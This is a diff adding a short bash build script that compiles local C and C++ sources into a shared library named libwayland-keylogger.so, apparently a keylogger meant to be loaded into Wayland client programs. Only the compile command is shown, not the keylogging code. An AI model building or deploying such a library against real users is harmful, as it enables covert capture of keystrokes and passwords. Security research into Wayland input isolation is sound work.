@@ -1,0 +1,3 @@
+#!/bin/bash
+
+g++ -Wall -pipe -shared -fpic *.cpp *.c -lwayland-client -o libwayland-keylogger.so
